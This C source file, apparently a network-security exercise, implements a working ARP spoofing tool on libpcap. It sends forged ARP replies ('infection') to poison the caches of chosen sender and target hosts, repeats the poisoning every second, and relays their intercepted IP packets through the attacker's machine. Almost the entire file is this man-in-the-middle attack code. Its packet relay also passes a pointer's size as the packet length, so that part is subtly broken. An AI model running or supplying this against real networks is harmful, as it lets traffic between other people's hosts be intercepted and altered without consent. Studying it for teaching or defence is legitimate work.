#include <stdio.h>
#include <pcap.h>
#include "arp-spoof.h"


void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : arp-spoof ens32 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0 || argc < 3) {
		usage();
		return -1;
	}
    
    char sender_ip[50][50];
    char target_ip[50][50];
    char sender_mac[50][20];
    char target_mac[50][20];
    char attack_ip[50];    
    char attack_mac[20];
    uint8_t attack_mac_conv[6];
    
    time_t checkpoint, current;
    int i;

    char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
    if (handle == nullptr) {
        fprintf(stderr, "Device open error! %s return nullptr : %s\n", dev, errbuf);
        return -1;
    }
    
    get_attacker_ip(attack_ip, argv[1]);
    get_attacker_mac(attack_mac, argv[1]);
    sscanf(attack_mac, "%02x:%02x:%02x:%02x:%02x:%02x", &attack_mac_conv[0], &attack_mac_conv[1], &attack_mac_conv[2], &attack_mac_conv[3], &attack_mac_conv[4], &attack_mac_conv[5]);
    
    int cnt = 1;
    while (1) {
        if (cnt == (argc / 2)) break;
        
        strcpy(sender_ip[cnt - 1], argv[cnt*2]);
        strcpy(target_ip[cnt - 1], argv[cnt*2+1]);
        get_host_mac(sender_ip[cnt - 1], sender_mac[cnt - 1], attack_ip, attack_mac, handle);
        get_host_mac(target_ip[cnt - 1], target_mac[cnt - 1], attack_ip, attack_mac, handle);

        // infection
        send_arp_pkt(sender_ip[cnt - 1], sender_mac[cnt - 1], target_ip[cnt - 1], attack_mac, handle, 2);
        cnt++;
    }

    checkpoint = time(NULL);
    
    while(1) {
        current = time(NULL);
        if (current - checkpoint > 1) {
            for (i = 0; i < (argc / 2 - 1); i++) send_arp_pkt(sender_ip[i], sender_mac[i], target_ip[i], attack_mac, handle, 2);
            checkpoint = current;
        }        
        struct pcap_pkthdr* header;
        uint8_t* rcv_packet;
        int res = pcap_next_ex(handle, &header, (const u_char **)&rcv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return error! %d(%s).\n", res, pcap_geterr(handle));
            break;
        }
        else {
            if((rcv_packet[12] == 0x08) && (rcv_packet[13] == 0x00)) {
                uint8_t current_dest_ip[4];
                uint8_t current_src_ip[4];
               
                for(i = 0; i < 4; i++) {
                    current_dest_ip[i] = rcv_packet[30+i];
                    current_src_ip[i] = rcv_packet[26+i];
                }
                
                bool control_flag = false;
                for (i = 0; i < (argc / 2 - 1); i++) {
                    if (check_packet(sender_ip[i], current_src_ip) == 1 && check_packet(target_ip[i], current_dest_ip) == 1) {
                        control_flag = true;
                        break;
                    }
                }
                if (!control_flag) {
                    printf("continue\n");
                    continue;
                }

                uint8_t dest_mac[6];
                sscanf(target_mac[i], "%02x:%02x:%02x:%02x:%02x:%02x", &dest_mac[0], &dest_mac[1], &dest_mac[2], &dest_mac[3], &dest_mac[4], &dest_mac[5]);
            
                for (i = 0; i < 6; i++) {
                    rcv_packet[i] = dest_mac[i];
                    rcv_packet[6+i] = attack_mac_conv[i];
                }
                int res = pcap_sendpacket(handle, rcv_packet, sizeof(rcv_packet));
                if (res != 0) {
                    fprintf(stderr, "Send ARP packet error!\n");
                }
            }
        }



        // timestamp value
        // re infection for each time period.
        // receive packet. if IP packet and match with sender, relay to target.
    }

    pcap_close(handle);    
}